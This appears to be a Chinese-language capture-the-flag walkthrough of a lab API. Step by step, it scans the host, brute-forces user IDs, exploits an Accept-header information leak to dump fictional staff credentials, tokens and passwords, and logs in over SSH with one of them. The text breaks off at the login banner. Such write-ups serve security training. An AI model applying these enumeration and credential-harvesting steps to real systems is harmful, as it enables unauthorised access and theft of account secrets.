## Nmap

先扫同网段存活主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
192.168.205.217 08:00:27:41:6d:e2       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ee:3d:16       VMware, Inc.
```

目标是：

```text
192.168.205.217
```

全端口扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.217
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 04:38 -0400
Nmap scan report for 192.168.205.217
Host is up (0.00089s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5566/tcp open  westec-connect
MAC Address: 08:00:27:41:6D:E2 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 5.50 seconds
```

开放端口很少：

```text
22/tcp   ssh
5566/tcp api
```

优先看 5566。

---

## API

访问根路径：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.217:5566
{"hint":"Some endpoints respond differently based on what you ask for.","service":"Maze Corp Internal API Gateway","version":"2.1.0"}
```

提示语：

```text
Some endpoints respond differently based on what you ask for.
```

这句话已经在暗示：

```text
某些端点会根据请求头里“你想要什么格式”返回不同结果
```

先看根路径支持哪些方法：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.217:5566 -X OPTIONS -i
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 08:39:25 GMT
Content-Type: text/html; charset=utf-8
Allow: OPTIONS, GET, HEAD
Content-Length: 0
Connection: close
```

根路径只支持：

```text
GET / HEAD / OPTIONS
```

POST 不允许：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.217:5566 -X POST
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

根路径没有太多信息，开始枚举端点。

---

## API 爆破

先手工试常见路径，没有结果：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ for p in api status health data users user fetch export import config admin debug info version render report convert parse; do printf "%-10s " "$p"; curl -s -o /dev/null -w "%{http_code}\n" 192.168.205.217:5566/$p; done
api        404
status     404
health     404
data       404
users      404
user       404
fetch      404
export     404
import     404
config     404
admin      404
debug      404
info       404
version    404
render     404
report     404
convert    404
parse      404
```

改为 `ffuf` 跑 `/api/`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ffuf -u http://192.168.205.217:5566/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc all -fc 404 -t 80

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.205.217:5566/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 80
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

user                    [Status: 400, Size: 97, Words: 5, Lines: 2, Duration: 159ms]
health                  [Status: 200, Size: 33, Words: 1, Lines: 2, Duration: 305ms]
```

发现两个有效端点：

```text
/api/health
/api/user
```

---

## 端点分析

先看 `/api/health`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -si 192.168.205.217:5566/api/health
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 08:48:51 GMT
Content-Type: application/json
Content-Length: 33
Connection: close

{"status":"ok","users_total":25}
```

这里给出一个关键数字：

```text
users_total = 25
```

说明数据库里一共有 25 个用户。

再看 `/api/user`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -s 192.168.205.217:5566/api/user; echo
{"error":"Bad Request","message":"Missing path variable 'uid'.","path":"/api/user","status":400}
```

提示非常明显：

```text
Missing path variable 'uid'
```

说明它要的是路径变量而不是 query 参数，也就是：

```text
/api/user/<uid>
```

如果给非整数：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -s "192.168.205.217:5566/api/user/abc"; echo
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

这说明它是整型路由。

到这里还不能直接判断敏感分支，只知道它会“根据你 ask for 的内容”返回不同东西，所以先把常见的 `Accept` 类型都试一遍。这里先对一个不存在的 uid 看响应特征：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ for ct in application/json application/xml text/xml application/yaml text/yaml application/x-yaml application/* '*/*'; do echo "== Accept: $ct =="; curl -si 192.168.205.217:5566/api/user/1 -H "Accept: $ct"; echo; done
== Accept: application/json ==
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 08:51:18 GMT
Content-Type: application/json
Content-Length: 97
Connection: close

{"error":"Not Found","message":"User with uid '1' not found.","path":"/api/user/1","status":404}

== Accept: application/xml ==
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 08:51:18 GMT
Content-Type: application/json
Content-Length: 97
Connection: close

{"error":"Not Found","message":"User with uid '1' not found.","path":"/api/user/1","status":404}

== Accept: text/xml ==
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 08:51:18 GMT
Content-Type: application/json
Content-Length: 97
Connection: close

{"error":"Not Found","message":"User with uid '1' not found.","path":"/api/user/1","status":404}

== Accept: application/yaml ==
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 08:51:19 GMT
Content-Type: application/json
Content-Length: 97
Connection: close

{"error":"Not Found","message":"User with uid '1' not found.","path":"/api/user/1","status":404}

== Accept: text/yaml ==
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 08:51:19 GMT
Content-Type: application/json
Content-Length: 97
Connection: close

{"error":"Not Found","message":"User with uid '1' not found.","path":"/api/user/1","status":404}

== Accept: application/x-yaml ==
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 08:51:19 GMT
Content-Type: application/json
Content-Length: 97
Connection: close

{"error":"Not Found","message":"User with uid '1' not found.","path":"/api/user/1","status":404}

== Accept: application/* ==
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 08:51:19 GMT
Content-Type: application/json
Content-Length: 97
Connection: close

{"error":"Not Found","message":"User with uid '1' not found.","path":"/api/user/1","status":404}

== Accept: */* ==
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 08:51:19 GMT
Content-Type: application/json
Content-Length: 97
Connection: close

{"error":"Not Found","message":"User with uid '1' not found.","path":"/api/user/1","status":404}
```

对不存在的用户没有明显区别，因此还是要先找到真实存在的 uid，再测格式差异。

---

## 爆破有效 uid

这里直接用 `ffuf` 对 `0-10000` 跑整数枚举，筛出所有返回 `200` 的用户：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ffuf -u http://192.168.205.217:5566/api/user/FUZZ -w <(seq 0 10000) -mc 200 -t 100

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.205.217:5566/api/user/FUZZ
 :: Wordlist         : FUZZ: /proc/self/fd/11
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200
________________________________________________

1222                    [Status: 200, Size: 284, Words: 20, Lines: 12, Duration: 236ms]
1226                    [Status: 200, Size: 288, Words: 20, Lines: 12, Duration: 233ms]
1335                    [Status: 200, Size: 283, Words: 20, Lines: 12, Duration: 219ms]
1595                    [Status: 200, Size: 292, Words: 20, Lines: 12, Duration: 219ms]
1818                    [Status: 200, Size: 280, Words: 20, Lines: 12, Duration: 211ms]
1954                    [Status: 200, Size: 287, Words: 20, Lines: 12, Duration: 195ms]
3931                    [Status: 200, Size: 287, Words: 20, Lines: 12, Duration: 201ms]
4257                    [Status: 200, Size: 286, Words: 20, Lines: 12, Duration: 205ms]
4526                    [Status: 200, Size: 286, Words: 20, Lines: 12, Duration: 203ms]
4741                    [Status: 200, Size: 283, Words: 20, Lines: 12, Duration: 199ms]
4828                    [Status: 200, Size: 281, Words: 20, Lines: 12, Duration: 202ms]
5119                    [Status: 200, Size: 283, Words: 20, Lines: 12, Duration: 204ms]
5219                    [Status: 200, Size: 288, Words: 20, Lines: 12, Duration: 206ms]
6530                    [Status: 200, Size: 289, Words: 20, Lines: 12, Duration: 205ms]
6694                    [Status: 200, Size: 282, Words: 20, Lines: 12, Duration: 204ms]
7009                    [Status: 200, Size: 286, Words: 20, Lines: 12, Duration: 203ms]
7465                    [Status: 200, Size: 286, Words: 20, Lines: 12, Duration: 203ms]
7920                    [Status: 200, Size: 287, Words: 20, Lines: 12, Duration: 202ms]
8024                    [Status: 200, Size: 282, Words: 20, Lines: 12, Duration: 205ms]
8038                    [Status: 200, Size: 286, Words: 20, Lines: 12, Duration: 204ms]
8764                    [Status: 200, Size: 285, Words: 20, Lines: 12, Duration: 202ms]
9050                    [Status: 200, Size: 282, Words: 20, Lines: 12, Duration: 204ms]
9182                    [Status: 200, Size: 285, Words: 20, Lines: 12, Duration: 207ms]
9409                    [Status: 200, Size: 287, Words: 20, Lines: 12, Duration: 203ms]
9944                    [Status: 200, Size: 284, Words: 20, Lines: 12, Duration: 201ms]
```

把这些 uid 保存下来备用：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ printf "1222\n1226\n1335\n1595\n1818\n1954\n3931\n4257\n4526\n4741\n4828\n5119\n5219\n6530\n6694\n7009\n7465\n7920\n8024\n8038\n8764\n9050\n9182\n9409\n9944\n" | tee /tmp/uids.txt
1222
1226
1335
1595
1818
1954
3931
4257
4526
4741
4828
5119
5219
6530
6694
7009
7465
7920
8024
8038
8764
9050
9182
9409
9944
```

---

## 不同 Accept 下的差异

这次对一个**真实存在**的 uid 再测一遍：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ for ct in application/json application/xml text/xml application/yaml text/yaml application/x-yaml application/* '*/*'; do echo "== Accept: $ct =="; curl -si 192.168.205.217:5566/api/user/1222 -H "Accept: $ct"; echo; done
== Accept: application/json ==
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 13:25:34 GMT
Content-Type: application/json
Content-Length: 318
Connection: close

{"api_key":null,"backup_codes":null,"department":"\u4ea7\u54c1\u90e8","display_name":"Guo Hui","email":"guohui1222@mazesec.dsz","has_secret":false,"password_hash":null,"phone":"13830237187","private_notes":null,"role":"product","sso_token":null,"status":"active","uid":1222,"username":"guohui1222","vpn_access":false}

== Accept: application/xml ==
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 13:25:34 GMT
Content-Type: text/xml; charset=utf-8; charset=utf-8
Content-Length: 284
Connection: close

<?xml version="1.0" ?>
<user>
  <uid>1222</uid>
  <username>guohui1222</username>
  <display_name>Guo Hui</display_name>
  <role>product</role>
  <department>产品部</department>
  <email>guohui1222@mazesec.dsz</email>
  <phone>13830237187</phone>
  <status>active</status>
</user>

== Accept: text/xml ==
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 13:25:34 GMT
Content-Type: text/xml; charset=utf-8; charset=utf-8
Content-Length: 284
Connection: close

<?xml version="1.0" ?>
<user>
  <uid>1222</uid>
  <username>guohui1222</username>
  <display_name>Guo Hui</display_name>
  <role>product</role>
  <department>产品部</department>
  <email>guohui1222@mazesec.dsz</email>
  <phone>13830237187</phone>
  <status>active</status>
</user>

== Accept: application/yaml ==
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 13:25:34 GMT
Content-Type: text/xml; charset=utf-8; charset=utf-8
Content-Length: 284
Connection: close

<?xml version="1.0" ?>
<user>
  <uid>1222</uid>
  <username>guohui1222</username>
  <display_name>Guo Hui</display_name>
  <role>product</role>
  <department>产品部</department>
  <email>guohui1222@mazesec.dsz</email>
  <phone>13830237187</phone>
  <status>active</status>
</user>

== Accept: text/yaml ==
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 13:25:34 GMT
Content-Type: text/xml; charset=utf-8; charset=utf-8
Content-Length: 284
Connection: close

<?xml version="1.0" ?>
<user>
  <uid>1222</uid>
  <username>guohui1222</username>
  <display_name>Guo Hui</display_name>
  <role>product</role>
  <department>产品部</department>
  <email>guohui1222@mazesec.dsz</email>
  <phone>13830237187</phone>
  <status>active</status>
</user>

== Accept: application/x-yaml ==
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 13:25:34 GMT
Content-Type: text/xml; charset=utf-8; charset=utf-8
Content-Length: 284
Connection: close

<?xml version="1.0" ?>
<user>
  <uid>1222</uid>
  <username>guohui1222</username>
  <display_name>Guo Hui</display_name>
  <role>product</role>
  <department>产品部</department>
  <email>guohui1222@mazesec.dsz</email>
  <phone>13830237187</phone>
  <status>active</status>
</user>

== Accept: application/* ==
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 13:25:34 GMT
Content-Type: text/xml; charset=utf-8; charset=utf-8
Content-Length: 284
Connection: close

<?xml version="1.0" ?>
<user>
  <uid>1222</uid>
  <username>guohui1222</username>
  <display_name>Guo Hui</display_name>
  <role>product</role>
  <department>产品部</department>
  <email>guohui1222@mazesec.dsz</email>
  <phone>13830237187</phone>
  <status>active</status>
</user>

== Accept: */* ==
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.14.3
Date: Tue, 09 Jun 2026 13:25:34 GMT
Content-Type: text/xml; charset=utf-8; charset=utf-8
Content-Length: 284
Connection: close

<?xml version="1.0" ?>
<user>
  <uid>1222</uid>
  <username>guohui1222</username>
  <display_name>Guo Hui</display_name>
  <role>product</role>
  <department>产品部</department>
  <email>guohui1222@mazesec.dsz</email>
  <phone>13830237187</phone>
  <status>active</status>
</user>
```

到这里，漏洞点就非常明确了：

```text
只有显式指定 Accept: application/json 时，才会返回完整敏感字段
其他常见 application/* 或 */* 都只会落到公开 XML 视图
```

所以后面的批量获取必须强制加上：

```text
-H 'Accept: application/json'
```

---

## 敏感信息泄露

现在把 25 个用户的完整 JSON 全部拉出来：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ while read u; do echo "== $u =="; curl -s 192.168.205.217:5566/api/user/$u -H 'Accept: application/json'; echo; done < /tmp/uids.txt
== 1222 ==
{"api_key":null,"backup_codes":null,"department":"\u4ea7\u54c1\u90e8","display_name":"Guo Hui","email":"guohui1222@mazesec.dsz","has_secret":false,"password_hash":null,"phone":"13830237187","private_notes":null,"role":"product","sso_token":null,"status":"active","uid":1222,"username":"guohui1222","vpn_access":false}

== 1226 ==
{"api_key":"sk_internal_811959240839","backup_codes":"[\"873826\", \"222881\", \"499022\", \"408220\"]","department":"\u4eba\u529b\u8d44\u6e90\u90e8","display_name":"Zhang Yi","email":"zhangyi1226@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$7212395190469581","phone":"13830045087","private_notes":"API \u7f51\u5173\u7ba1\u7406\u540e\u53f0: https://admin.internal.1226.corp/token=726302371","role":"hr","sso_token":"sso_hr_1226_765523","status":"active","uid":1226,"username":"zhangyi1226","vpn_access":true}

== 1335 ==
{"api_key":"sk_internal_924543486034","backup_codes":"[\"831680\", \"639540\", \"977673\", \"390600\"]","department":"\u8fd0\u7ef4\u90e8","display_name":"Zhou Xin","email":"zhouxin1335@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$9920196542542048","phone":"13890468529","private_notes":"\u6570\u636e\u5e93\u8fde\u63a5\u4e32: mysql://admin:DbP4ss1335@db1335.internal:3306","role":"ops","sso_token":"sso_ops_1335_697223","status":"active","uid":1335,"username":"zhouxin1335","vpn_access":true}

== 1595 ==
{"api_key":"sk_internal_573115384412","backup_codes":"[\"541803\", \"539378\", \"851532\", \"349340\"]","department":"\u7814\u53d1\u90e8","display_name":"Huang Wei","email":"huangwei1595@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$3746499262861690","phone":"13840044318","private_notes":"VPN \u914d\u7f6e\u6587\u4ef6: /etc/openvpn/client1595.ovpn","role":"developer","sso_token":"sso_developer_1595_454267","status":"active","uid":1595,"username":"huangwei1595","vpn_access":true}

== 1818 ==
{"api_key":"sk_internal_840623136473","backup_codes":"[\"709419\", \"353364\", \"664903\", \"343165\"]","department":"\u8fd0\u7ef4\u90e8","display_name":"Zhu Jun","email":"zhujun1818@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$7614128357075414","phone":"13847372344","private_notes":"API \u7f51\u5173\u7ba1\u7406\u540e\u53f0: https://admin.internal.1818.corp/token=239851954","role":"ops","sso_token":"sso_ops_1818_875415","status":"active","uid":1818,"username":"zhujun1818","vpn_access":true}

== 1954 ==
{"api_key":"sk_internal_678689100421","backup_codes":"[\"827509\", \"834495\", \"759018\", \"415709\"]","department":"\u8d22\u52a1\u90e8","display_name":"Sun Dong","email":"sundong1954@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$1386953897523084","phone":"13896823803","private_notes":"\u4f01\u4e1a\u5fae\u4fe1 webhook: https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=321456147","role":"finance","sso_token":"sso_finance_1954_231228","status":"active","uid":1954,"username":"sundong1954","vpn_access":true}

== 3931 ==
{"api_key":null,"backup_codes":null,"department":"\u5916\u5305\u56e2\u961f","display_name":"Zhou Yang","email":"zhouyang3931@mazesec.dsz","has_secret":false,"password_hash":null,"phone":"13824346569","private_notes":null,"role":"contractor","sso_token":null,"status":"active","uid":3931,"username":"zhouyang3931","vpn_access":false}

== 4257 ==
{"api_key":null,"backup_codes":null,"department":"\u8bbe\u8ba1\u90e8","display_name":"Zhu Peng","email":"zhupeng4257@mazesec.dsz","has_secret":false,"password_hash":null,"phone":"13885724593","private_notes":null,"role":"design","sso_token":null,"status":"active","uid":4257,"username":"zhupeng4257","vpn_access":false}

== 4526 ==
{"api_key":null,"backup_codes":null,"department":"\u9500\u552e\u90e8","display_name":"Luo Jian","email":"luojian4526@mazesec.dsz","has_secret":false,"password_hash":null,"phone":"13885424047","private_notes":null,"role":"sales","sso_token":null,"status":"active","uid":4526,"username":"luojian4526","vpn_access":false}

== 4741 ==
{"api_key":null,"backup_codes":null,"department":"\u4ea7\u54c1\u90e8","display_name":"Luo Yi","email":"luoyi4741@mazesec.dsz","has_secret":false,"password_hash":null,"phone":"13846848018","private_notes":null,"role":"product","sso_token":null,"status":"active","uid":4741,"username":"luoyi4741","vpn_access":false}

== 4828 ==
{"api_key":null,"backup_codes":null,"department":"\u5916\u90e8\u5408\u4f5c","display_name":"Xu Yi","email":"xuyi4828@mazesec.dsz","has_secret":false,"password_hash":null,"phone":"13826244393","private_notes":null,"role":"guest","sso_token":null,"status":"active","uid":4828,"username":"xuyi4828","vpn_access":false}

== 5119 ==
{"api_key":null,"backup_codes":null,"department":"\u4ea7\u54c1\u90e8","display_name":"Xu Ping","email":"xuping5119@mazesec.dsz","has_secret":false,"password_hash":null,"phone":"13829047368","private_notes":null,"role":"product","sso_token":null,"status":"active","uid":5119,"username":"xuping5119","vpn_access":false}

== 5219 ==
{"api_key":"sk_internal_217855675970","backup_codes":"[\"682844\", \"235671\", \"451527\", \"632819\"]","department":"\u8fd0\u7ef4\u90e8","display_name":"Wang Qiang","email":"wangqiang5219@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$5546387341610051","phone":"13866983525","private_notes":"\u6570\u636e\u5e93\u8fde\u63a5\u4e32: mysql://admin:DbP4ss5219@db5219.internal:3306","role":"ops","sso_token":"sso_ops_5219_169217","status":"active","uid":5219,"username":"wangqiang5219","vpn_access":true}

== 6530 ==
{"api_key":"sk_internal_116444220617","backup_codes":"[\"648495\", \"289168\", \"375326\", \"604194\"]","department":"\u7814\u53d1\u4e8c\u90e8","display_name":"Sun Fei","email":"sunfei6530@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$5364283556298436","phone":"13881139200","private_notes":"Jenkins \u7ba1\u7406\u5458\u5bc6\u7801: Jenkins6530#Admin","role":"developer","sso_token":"sso_developer_6530_717712","status":"active","uid":6530,"username":"sunfei6530","vpn_access":true}

== 6694 ==
{"api_key":null,"backup_codes":null,"department":"\u5e02\u573a\u90e8","display_name":"He Si","email":"hesi6694@mazesec.dsz","has_secret":false,"password_hash":null,"phone":"13810641983","private_notes":null,"role":"marketing","sso_token":null,"status":"active","uid":6694,"username":"hesi6694","vpn_access":false}

== 7009 ==
{"api_key":null,"backup_codes":null,"department":"\u5916\u5305\u56e2\u961f","display_name":"Zhou Xia","email":"zhouxia7009@mazesec.dsz","has_secret":false,"password_hash":null,"phone":"13882885987","private_notes":null,"role":"contractor","sso_token":null,"status":"active","uid":7009,"username":"zhouxia7009","vpn_access":false}

== 7465 ==
{"api_key":null,"backup_codes":null,"department":"\u5916\u5305\u56e2\u961f","display_name":"Guo Hua","email":"guohua7465@mazesec.dsz","has_secret":false,"password_hash":null,"phone":"13821569223","private_notes":null,"role":"contractor","sso_token":null,"status":"active","uid":7465,"username":"guohua7465","vpn_access":false}

== 7920 ==
{"api_key":"sk_internal_464766883623","backup_codes":"[\"260921\", \"288066\", \"463417\", \"894174\"]","department":"\u4eba\u529b\u8d44\u6e90\u90e8","display_name":"He Long","email":"helong7920@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$1045328665585101","phone":"13830690378","private_notes":"Jenkins \u7ba1\u7406\u5458\u5bc6\u7801: Jenkins7920#Admin","role":"hr","sso_token":"sso_hr_7920_528232","status":"active","uid":7920,"username":"helong7920","vpn_access":true}

== 8024 ==
{"api_key":null,"backup_codes":null,"department":"\u5916\u90e8\u5408\u4f5c","display_name":"Li Wen","email":"liwen8024@mazesec.dsz","has_secret":false,"password_hash":null,"phone":"13828445950","private_notes":null,"role":"guest","sso_token":null,"status":"active","uid":8024,"username":"liwen8024","vpn_access":false}

== 8038 ==
{"api_key":"sk_internal_974818108609","backup_codes":"[\"344818\", \"988944\", \"873105\", \"266046\"]","department":"\u4fe1\u606f\u6280\u672f\u90e8","display_name":"Lin Hao","email":"linhao8038@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$7096212241602057","phone":"13853496395","private_notes":"Jenkins \u7ba1\u7406\u5458\u5bc6\u7801: Jenkins8038#Admin","role":"administrator","sso_token":"sso_administrator_8038_725761","status":"active","uid":8038,"username":"linhao8038","vpn_access":true}

== 8764 ==
{"api_key":"sk_internal_297624172687","backup_codes":"[\"946020\", \"203879\", \"488566\", \"401628\"]","department":"\u7814\u53d1\u90e8","display_name":"Gao Yan","email":"gaoyan8764@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$3636850726830173","phone":"13898408861","private_notes":"\u670d\u52a1\u5668 SSH \u5bc6\u7801: R00t8764!Pass","role":"developer","sso_token":"sso_developer_8764_245587","status":"active","uid":8764,"username":"gaoyan8764","vpn_access":true}

== 9050 ==
{"api_key":null,"backup_codes":null,"department":"\u9500\u552e\u90e8","display_name":"Xu Wei","email":"xuwei9050@mazesec.dsz","has_secret":false,"password_hash":null,"phone":"13879705234","private_notes":null,"role":"sales","sso_token":null,"status":"active","uid":9050,"username":"xuwei9050","vpn_access":false}

== 9182 ==
{"api_key":"sk_internal_540094580489","backup_codes":"[\"480869\", \"614114\", \"931691\", \"229605\"]","department":"\u8fd0\u7ef4\u90e8","display_name":"Zhou San","email":"zhousan9182@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$3482634224079702","phone":"13872573968","private_notes":"\u4f01\u4e1a\u5fae\u4fe1 webhook: https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=385237898","role":"ops","sso_token":"sso_ops_9182_701469","status":"active","uid":9182,"username":"zhousan9182","vpn_access":true}

== 9409 ==
{"api_key":"sk_internal_747986912366","backup_codes":"[\"518583\", \"522657\", \"645729\", \"380194\"]","department":"\u4eba\u529b\u8d44\u6e90\u90e8","display_name":"Zhou Peng","email":"zhoupeng9409@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$1754794148606713","phone":"13811811655","private_notes":"VPN \u914d\u7f6e\u6587\u4ef6: /etc/openvpn/client9409.ovpn","role":"hr","sso_token":"sso_hr_9409_230834","status":"active","uid":9409,"username":"zhoupeng9409","vpn_access":true}

== 9944 ==
{"api_key":"sk_internal_577387369293","backup_codes":"[\"308810\", \"955013\", \"236079\", \"354299\"]","department":"\u5b89\u5168\u90e8","display_name":"Zhu Wei","email":"zhuwei9944@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$8949234492517412","phone":"13814692474","private_notes":"VPN \u914d\u7f6e\u6587\u4ef6: /etc/openvpn/client9944.ovpn","role":"security","sso_token":"sso_security_9944_322993","status":"active","uid":9944,"username":"zhuwei9944","vpn_access":true}
```

到这里，敏感信息泄露已经非常完整了。除了用户名、部门、邮箱、手机号之外，还拿到了大量内部敏感数据。

### 从泄露数据中可直接获得的内容

可以总结出以下几类高价值信息：

#### 1. SSH 明文密码

```text
gaoyan8764 / R00t8764!Pass
```

对应记录：

```json
{"api_key":"sk_internal_297624172687","backup_codes":"[\"946020\", \"203879\", \"488566\", \"401628\"]","department":"研发部","display_name":"Gao Yan","email":"gaoyan8764@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$3636850726830173","phone":"13898408861","private_notes":"服务器 SSH 密码: R00t8764!Pass","role":"developer","sso_token":"sso_developer_8764_245587","status":"active","uid":8764,"username":"gaoyan8764","vpn_access":true}
```

#### 2. Jenkins 管理员密码

```text
Jenkins6530#Admin
Jenkins7920#Admin
Jenkins8038#Admin
```

对应三条记录分别是：

```json
{"api_key":"sk_internal_116444220617","backup_codes":"[\"648495\", \"289168\", \"375326\", \"604194\"]","department":"研发二部","display_name":"Sun Fei","email":"sunfei6530@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$5364283556298436","phone":"13881139200","private_notes":"Jenkins 管理员密码: Jenkins6530#Admin","role":"developer","sso_token":"sso_developer_6530_717712","status":"active","uid":6530,"username":"sunfei6530","vpn_access":true}
```

```json
{"api_key":"sk_internal_464766883623","backup_codes":"[\"260921\", \"288066\", \"463417\", \"894174\"]","department":"人力资源部","display_name":"He Long","email":"helong7920@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$1045328665585101","phone":"13830690378","private_notes":"Jenkins 管理员密码: Jenkins7920#Admin","role":"hr","sso_token":"sso_hr_7920_528232","status":"active","uid":7920,"username":"helong7920","vpn_access":true}
```

```json
{"api_key":"sk_internal_974818108609","backup_codes":"[\"344818\", \"988944\", \"873105\", \"266046\"]","department":"信息技术部","display_name":"Lin Hao","email":"linhao8038@mazesec.dsz","has_secret":true,"password_hash":"$2b$12$7096212241602057","phone":"13853496395","private_notes":"Jenkins 管理员密码: Jenkins8038#Admin","role":"administrator","sso_token":"sso_administrator_8038_725761","status":"active","uid":8038,"username":"linhao8038","vpn_access":true}
```

#### 3. 数据库连接串

```text
mysql://admin:DbP4ss1335@db1335.internal:3306
mysql://admin:DbP4ss5219@db5219.internal:3306
```

#### 4. API 网关后台地址和 token

```text
https://admin.internal.1226.corp/token=726302371
https://admin.internal.1818.corp/token=239851954
```

#### 5. 企业微信 webhook

```text
https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=321456147
https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=385237898
```

#### 6. VPN 配置文件路径

```text
/etc/openvpn/client1595.ovpn
/etc/openvpn/client9409.ovpn
/etc/openvpn/client9944.ovpn
```

#### 7. 其他内部令牌和恢复信息

每个敏感用户还泄露了：

```text
api_key
backup_codes
sso_token
password_hash
vpn_access
```

从利用角度来说，最直接的落地点有两个：

```text
1. SSH 明文密码
2. Jenkins 管理员密码
```

这两个就足够完成整条攻击链了。

---

## SSH 初始立足

直接用泄露到的 SSH 密码登录：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh gaoyan8764@192.168.205.217
gaoyan8764@192.168.205.217's password:
```

输入：

```text
R00t8764!Pass
```

登录成功：

```bash
              _
